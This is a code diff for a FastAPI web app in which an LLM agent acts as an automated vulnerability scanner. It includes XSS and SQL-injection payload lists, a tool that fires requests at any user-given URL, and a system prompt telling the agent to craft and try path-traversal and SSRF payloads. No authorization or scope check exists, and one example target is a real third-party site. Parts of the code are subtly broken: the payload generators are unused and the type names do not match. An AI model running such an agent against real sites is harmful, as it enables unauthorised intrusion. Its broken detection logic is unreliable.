@@ -1,54 +1,177 @@
 import os
 import uvicorn
-from fastapi import FastAPI, APIRouter
+from fastapi import FastAPI, APIRouter, HTTPException
 from fastapi.responses import HTMLResponse
-from pydantic import BaseModel
+from pydantic import BaseModel, Field
 from dotenv import load_dotenv
 from typing import Optional, List, Dict
 import asyncio
 import httpx
-import json
 import re
 from bs4 import BeautifulSoup
+import random
+import string
+import time
 
 from langchain_google_genai import ChatGoogleGenerativeAI
 from langchain.agents import AgentExecutor, create_tool_calling_agent
 from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
 from langchain_core.tools import tool
 from langchain.memory import ConversationBufferMemory
+from google_search import search as google_search_tool # google_searchツールのインポート
 
 # --- 環境設定 ---
 load_dotenv()
 app = FastAPI()
 router = APIRouter()
 
+# --- 脆弱性ペイロードリストとファジング関数 ---
+def generate_xss_payloads(num_payloads: int = 5) -> List[str]:
+    """
+    ランダムなXSSペイロードを生成
+    """
+    base_payloads = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>",
+        "javascript:alert('XSS');",
+        "';alert('XSS');//",
+        "<body onload='alert(\"XSS\")'>",
+        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+        "<a href='javascript:alert(\"XSS\")'>click</a>"
+    ]
+    
+    encoded_payloads = []
+    for payload in base_payloads:
+        if random.random() < 0.3: # 30%の確率でエンコーディングを適用
+            encoded_payloads.append(payload.encode('utf-8').hex()) # 例として16進数エンコーディング
+            encoded_payloads.append("&#" + ";&#".join([str(ord(c)) for c in payload])) # HTML数値文字参照
+            
+    random_payloads = []
+    for _ in range(num_payloads):
+        random_chars = ''.join(random.choices(string.ascii_letters + string.digits + "'\"`()", k=random.randint(5, 15)))
+        payload = f"<script>alert('{random_chars}')</script>"
+        random_payloads.append(payload)
+        
+    return base_payloads + encoded_payloads + random_payloads
+
+def generate_sqli_payloads(num_payloads: int = 5) -> List[str]:
+    """
+    ランダムなSQLインジェクションペイロードを生成
+    """
+    base_payloads = [
+        "' OR 1=1--",
+        "' UNION SELECT NULL, NULL, NULL--",
+        "' OR '1'='1'#",
+        "admin' --",
+        "admin' #",
+        "sleep(5)",
+        "benchmark(10000000,MD5(1))"
+    ]
+    
+    blind_payloads = [
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' OR 1=1--",
+        "' OR 1=2--",
+        "') AND ('1'='1'--",
+        "') AND ('1'='2'--"
+    ]
+    
+    random_payloads = []
+    for _ in range(num_payloads):
+        random_payload = f"'{random.choice(['OR','AND'])} '1'='1'-- {random.randint(1, 1000)}"
+        random_payloads.append(random_payload)
+        
+    return base_payloads + blind_payloads + random_payloads
+
 # --- ツール定義 ---
 @tool
-async def send_http_request(url: str, method: str, data: str = None, headers: dict = None) -> str:
+async def search_cve_by_tech_stack(tech_stack: List[Dict]) -> str:
     """
-    指定されたURLに非同期でHTTPリクエストを送信し、レスポンスと脆弱性パターン検知フラグを返す。
+    指定された技術スタック名とバージョンに関連するCVE情報をGoogle Searchで検索する。
+    """
+    cve_results = []
+    for item in tech_stack:
+        name = item.get('name')
+        version = item.get('version')
+        if name:
+            query = f"{name} {version} CVE" if version else f"{name} CVE"
+            print(f"Searching for CVEs with query: '{query}'")
+            
+            try:
+                search_results = await google_search_tool(queries=[query])
+                result_text = ""
+                if search_results and search_results[0].results:
+                    for res in search_results[0].results:
+                        result_text += f"Title: {res.source_title}\nURL: {res.url}\nSnippet: {res.snippet}\n\n"
+                else:
+                    result_text = f"No search results found for {name}."
+                cve_results.append(f"--- CVE Search for {name} ({version}) ---\n{result_text}")
+            except Exception as e:
+                cve_results.append(f"CVE search failed for {name}: {e}")
+    
+    return "\n".join(cve_results)
+
+@tool
+async def send_http_request_with_payload(url: str, method: str, payload_type: str, data: str = None, headers: dict = None) -> str:
+    """
+    指定されたURLにHTTPリクエストを送信し、ペイロードに応じた脆弱性パターンを検出する。
     """
     async with httpx.AsyncClient() as client:
         try:
+            # 正常なレスポンスを取得して差分比較の基準とする
+            normal_response = await client.request(method, url, timeout=15)
+            
+            # ペイロードを挿入してリクエストを送信
+            start_time = time.time()
             response = await client.request(method, url, data=data, headers=headers, timeout=15)
+            elapsed_time = time.time() - start_time
             
             vulnerability_flags = []
             
-            # SQLインジェクション
-            if re.search(r"sql syntax|mysql|query error|fatal error", response.text, re.IGNORECASE):
-                vulnerability_flags.append("SQL_ERROR_DETECTED")
-            
-            # XSS
-            if re.search(r"<script>alert\(|javascript:alert\(", response.text, re.IGNORECASE):
-                vulnerability_flags.append("XSS_PAYLOAD_ECHOED")
-            
-            # Path Traversal
-            if re.search(r"root:[xX]:0:0:|c:\\windows|etc/passwd|/etc/passwd", response.text, re.IGNORECASE):
-                vulnerability_flags.append("PATH_TRAVERSAL_CONTENT_DETECTED")
+            # --- SQLインジェクションの検出 ---
+            if payload_type == "sqli":
+                sql_error_patterns = [
+                    r"sql syntax", r"mysql", r"query error", r"unclosed quotation",
+                    r"driver error", r"postgis error", r"pg_error", r"ora-[0-9]+"
+                ]
+                if response.status_code == 500 or any(re.search(p, response.text, re.IGNORECASE) for p in sql_error_patterns):
+                    vulnerability_flags.append("SQLI_ERROR_DETECTED")
+                
+                # ブーリアンベースSQLiの検出
+                if data and ("' AND 1=1--" in data or "' OR 1=1--" in data):
+                    response_diff = abs(len(response.text) - len(normal_response.text))
+                    if response_diff < 100: # 応答サイズがほぼ同じ
+                        vulnerability_flags.append("SQLI_BOOLEAN_BASED_DETECTED")
 
-            # SSRF
-            if re.search(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}", response.text):
-                vulnerability_flags.append("SSRF_INTERNAL_IP_DETECTED")
+                # タイムベースの検出
+                if "sleep" in str(data) and elapsed_time > 4:
+                    vulnerability_flags.append("SQLI_TIME_BASED_DETECTED")
+            
+            # --- XSSの検出 ---
+            if payload_type == "xss":
+                # 反射型XSSの検出
+                if data and str(data) in response.text:
+                    vulnerability_flags.append("XSS_PAYLOAD_REFLECTED")
+                
+                # DOM-based XSSの検出 (JavaScript内での反射)
+                if re.search(r"var\s+\w+\s*=\s*['\"]" + re.escape(data) + r"['\"]", response.text) or \
+                   re.search(r"document\.write\s*\(\s*['\"]" + re.escape(data) + r"['\"]", response.text):
+                    vulnerability_flags.append("XSS_DOM_BASED_DETECTED")
+                
+                # 特定のイベントハンドラやタグの検出
+                if re.search(r"<img[^>]*onerror=|javascript:", response.text, re.IGNORECASE):
+                    vulnerability_flags.append("XSS_EVENT_HANDLER_DETECTED")
+
+            # --- その他の脆弱性 ---
+            if payload_type == "path_traversal":
+                if re.search(r"root:[xX]:0:0:|c:\\windows|etc/passwd|/etc/passwd", response.text, re.IGNORECASE):
+                    vulnerability_flags.append("PATH_TRAVERSAL_CONTENT_DETECTED")
+
+            if payload_type == "ssrf":
+                if re.search(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}", response.text):
+                    vulnerability_flags.append("SSRF_INTERNAL_IP_DETECTED")
 
             flags_str = " | ".join(vulnerability_flags) if vulnerability_flags else "No specific vulnerability pattern detected."
             
@@ -60,15 +183,15 @@ async def send_http_request(url: str, method: str, data: str = None, headers: di
             return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body: {response.text[:500]}"
             
         except httpx.RequestError as e:
-            return f"Request Error: {e}"
+            raise HTTPException(status_code=500, detail=f"Request Error: {e}")
 
 @tool
 async def detect_waf(url: str) -> str:
     """
     指定されたURLに非同期でリクエストを送信し、WAFの痕跡を検出する。
     """
-    async with httpx.AsyncClient() as client:
-        try:
+    try:
+        async with httpx.AsyncClient() as client:
             response = await client.get(url, timeout=10)
             waf_indicators = {
                 "Cloudflare": "cloudflare", "Sucuri": "sucuri", "AWS WAF": "awselb",
@@ -78,32 +201,32 @@ async def detect_waf(url: str) -> str:
                 if name in response.headers.get('Server', '').lower() or name in response.text.lower():
                     return f"WAF detected: {indicator}"
             return "No known WAF detected."
-        except httpx.RequestError as e:
-            return f"WAF detection error: {e}"
+    except httpx.RequestError as e:
+        raise HTTPException(status_code=500, detail=f"WAF detection error: {e}")
 
 # --- Pydantic モデル定義 ---
 class TechStackItem(BaseModel):
-    name: str
-    version: Optional[str] = None
+    name: str = Field(..., description="技術スタックの名前 (例: 'PHP', 'WordPress')")
+    version: Optional[str] = Field(None, description="バージョン情報")
 
 class ScanInput(BaseModel):
-    url: str
-    target_endpoint: str
-    tech_stack: List[TechStackItem]
-    vulnerability_types: Optional[List[str]] = ["xss", "sql_injection", "path_traversal", "ssrf"]
+    url: str = Field(..., description="スキャン対象のベースURL")
+    target_endpoint: str = Field(..., description="脆弱性をテストするエンドポイント (例: '/search.php')")
+    tech_stack: List[TechStackItem] = Field(..., description="ターゲットの技術スタック情報")
+    vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf"], description="診断する脆弱性タイプ")
 
 # --- APIエンドポイント ---
 @router.post("/start_scan")
 async def start_scan(scan_input: ScanInput):
     llm = ChatGoogleGenerativeAI(model="gemini-2.5-flash")
     
-    tools = [send_http_request, detect_waf]
-    memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True) # return_messages=Trueを追加
+    tools = [send_http_request_with_payload, detect_waf, search_cve_by_tech_stack]
+    memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True)
     
     agent_prompt = ChatPromptTemplate.from_messages([
         ("system", "あなたはバグバウンティの専門家であり、高度なウェブ脆弱性スキャナーです。"),
-        ("system", "ユーザーが提供する技術スタック情報に基づいて、脆弱性候補を発見し、検証してください。"),
-        ("system", "あなたの思考プロセスは以下のステップに従います: 1. `detect_waf`ツールでWAFの有無を調べる。2. その結果と技術スタックに基づいて、最適な攻撃ペイロードを生成する。3. `send_http_request`ツールでペイロードを試行する。4. 応答に含まれる**Flags**とレスポンス内容を分析し、脆弱性候補を判断する。5. 複数のペイロードでテストを繰り返す。6. 脆弱性が確認できたら、詳細な報告書を生成する。"),
+        ("system", "ユーザーが提供する情報に基づき、段階的に脆弱性を検証してください。"),
+        ("system", "あなたの思考プロセスは以下のステップに従います: 1. `detect_waf`ツールでWAFの有無を調べる。2. `search_cve_by_tech_stack`ツールを呼び出し、技術スタックに関連するCVEを検索する。3. その結果と技術スタックに基づいて、最適な攻撃ペイロードを生成する。4. `send_http_request_with_payload`ツールでペイロードを試行する。5. 応答に含まれる**Flags**とレスポンス内容を分析し、脆弱性候補を判断する。6. 複数のペイロードでテストを繰り返す。7. 脆弱性が確認できたら、詳細な報告書を生成する。"),
         ("system", "攻撃ペイロードの生成、応答の分析、報告書の作成はすべてあなたの思考プロセスで行い、必要に応じて適切なツールを呼び出してください。"),
         ("system", "特に、Path Traversalではペイロードとして`../`や`..\\`などを、SSRFでは`http://127.0.0.1`や`http://10.0.0.1`などを試行し、`Flags`の出力を注意深く観察してください。"),
         MessagesPlaceholder("chat_history"),
@@ -118,7 +241,7 @@ async def start_scan(scan_input: ScanInput):
         memory=memory
     )
     
-    tech_stack_str = ", ".join([f"{item.name} ({item.version})" if item.version else item.name for item in scan_input.tech_stack])
+    tech_stack_str = str(scan_input.tech_stack)
     
     initial_input = f"""
     ターゲットURL: {scan_input.url}
@@ -129,16 +252,10 @@ async def start_scan(scan_input: ScanInput):
     """
     
     try:
-        # 初回実行時、チャット履歴は空のリストでOK
-        result = await agent_executor.ainvoke({
-            "input": initial_input
-        })
-        
+        result = await agent_executor.ainvoke({"input": initial_input})
         final_report = result.get('output', '診断中に予期せぬエラーが発生しました。')
         return {"status": "scanning_complete", "final_report": final_report}
-        
     except Exception as e:
-        print(f"An error occurred during agent execution: {e}")
         return {"status": "error", "final_report": f"診断中にエラーが発生しました: {e}"}
 
 # --- ヘルスチェックエンドポイントの追加 ---
@@ -151,114 +268,66 @@ async def health_check():
 async def serve_frontend():
     html_content = """
     <!DOCTYPE html>
-    <html lang="ja">
+    <html>
     <head>
-        <meta charset="UTF-8">
-        <title>AI Powered Vulnerability Scanner</title>
+        <title>脆弱性スキャナー</title>
         <style>
-            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2rem; background-color: #f4f7f6; color: #333; }
-            .container { max-width: 800px; margin: auto; padding: 2rem; background-color: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
-            h1 { color: #0056b3; text-align: center; }
-            label { font-weight: 600; margin-top: 1rem; display: block; }
-            input[type="text"], textarea { width: 100%; padding: 0.75rem; margin-top: 0.5rem; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-            button { background-color: #007bff; color: white; padding: 0.75rem 1.5rem; border: none; border-radius: 4px; cursor: pointer; font-size: 1rem; margin-top: 1.5rem; width: 100%; }
-            button:hover { background-color: #0056b3; }
-            #loading { text-align: center; margin-top: 2rem; display: none; }
-            pre { background-color: #f8f9fa; border: 1px solid #e9ecef; padding: 1rem; border-radius: 4px; white-space: pre-wrap; word-wrap: break-word; }
+            body { font-family: sans-serif; margin: 2em; }
+            input, button { padding: 0.5em; margin-top: 0.5em; }
+            #output { margin-top: 1em; padding: 1em; border: 1px solid #ccc; background-color: #f9f9f9; white-space: pre-wrap; }
         </style>
     </head>
     <body>
-        <div class="container">
-            <h1>AI脆弱性スキャナー</h1>
-            <p>診断対象のURLと、Wappalyzerで取得した技術情報を入力してください。</p>
-
-            <label for="url">対象URL:</label>
-            <input type="text" id="url" placeholder="例: https://www.ieice.org" required>
-
-            <label for="endpoint">攻撃対象エンドポイント:</label>
-            <input type="text" id="endpoint" placeholder="例: /contact-form" required>
-
-            <label for="tech_stack">Wappalyzer結果 (CSV形式):</label>
-            <textarea id="tech_stack" rows="10" placeholder='ここにWappalyzerの結果を貼り付けてください。ヘッダー行とデータ行を含むCSV形式でお願いします。\n例: \n"URL","JavaScript frameworks","Web servers"\n"https://example.com","React","Apache HTTP Server"'></textarea>
-
-            <button onclick="startScan()">スキャン開始</button>
-
-            <div id="loading">
-                <p>スキャン中...しばらくお待ちください。</p>
-            </div>
-
-            <div id="result">
-                <h2>診断結果</h2>
-                <pre id="report"></pre>
-            </div>
-        </div>
+        <h1>脆弱性スキャン</h1>
+        <p>ターゲット情報を入力してスキャンを開始してください。</p>
+        <hr>
+        <label for="url">ベースURL:</label><br>
+        <input type="text" id="url" value="http://localhost:8000" size="50"><br>
+        <label for="endpoint">攻撃対象エンドポイント:</label><br>
+        <input type="text" id="endpoint" value="/search" size="50"><br>
+        <label for="tech_stack">技術スタック (カンマ区切り):</label><br>
+        <input type="text" id="tech_stack" value="WordPress 5.8, Apache 2.4.46" size="50"><br>
+        <button onclick="startScan()">スキャン開始</button>
+        <div id="output"></div>
 
         <script>
             async function startScan() {
                 const url = document.getElementById('url').value;
                 const endpoint = document.getElementById('endpoint').value;
                 const techStackInput = document.getElementById('tech_stack').value;
+                const outputDiv = document.getElementById('output');
                 
-                if (!url || !endpoint || !techStackInput) {
-                    alert("すべてのフィールドを入力してください。");
-                    return;
-                }
+                outputDiv.textContent = 'スキャンを開始しています...';
 
-                document.getElementById('loading').style.display = 'block';
-                document.getElementById('report').textContent = '';
+                const techStackArray = techStackInput.split(',').map(item => {
+                    const parts = item.trim().split(' ');
+                    return { name: parts[0], version: parts[1] || null };
+                });
 
-                let techStackData = [];
-                try {
-                    const lines = techStackInput.trim().split('\\n');
-                    if (lines.length < 2) {
-                        throw new Error("CSVにはヘッダー行とデータ行が必要です。");
-                    }
-
-                    const headers = lines[0].split(',').map(h => h.trim().replace(/^"|"$/g, ''));
-                    const data = lines[1].split(',').map(d => d.trim().replace(/^"|"$/g, ''));
-
-                    for (let i = 0; i < headers.length; i++) {
-                        if (data[i] && data[i] !== '') {
-                            const techNames = data[i].split(';').map(t => t.trim());
-                            techNames.forEach(techName => {
-                                const [name, version] = techName.split(' ').map(s => s.trim());
-                                techStackData.push({
-                                    name: name,
-                                    version: version || null
-                                });
-                            });
-                        }
-                    }
-                } catch (e) {
-                    alert(`CSVのパースに失敗しました: ${e.message}`);
-                    document.getElementById('loading').style.display = 'none';
-                    return;
-                }
-
-                const data = {
+                const scanData = {
                     url: url,
                     target_endpoint: endpoint,
-                    tech_stack: techStackData
+                    tech_stack: techStackArray,
+                    vulnerability_types: ["xss", "sql_injection", "path_traversal", "ssrf"]
                 };
 
                 try {
                     const response = await fetch('/start_scan', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(scanData)
                     });
-
-                    if (!response.ok) {
-                        throw new Error(`HTTP Error: ${response.status}`);
-                    }
-
+                    
                     const result = await response.json();
-                    document.getElementById('report').textContent = result.final_report;
-
+                    if (response.ok) {
+                        outputDiv.textContent = 'スキャン完了\n\n' + JSON.stringify(result.final_report, null, 2);
+                    } else {
+                        outputDiv.textContent = 'エラー: ' + result.detail;
+                    }
                 } catch (error) {
-                    document.getElementById('report').textContent = `診断中にエラーが発生しました: ${error}`;
-                } finally {
-                    document.getElementById('loading').style.display = 'none';
+                    outputDiv.textContent = 'ネットワークエラー: ' + error.message;
                 }
             }
         </script>
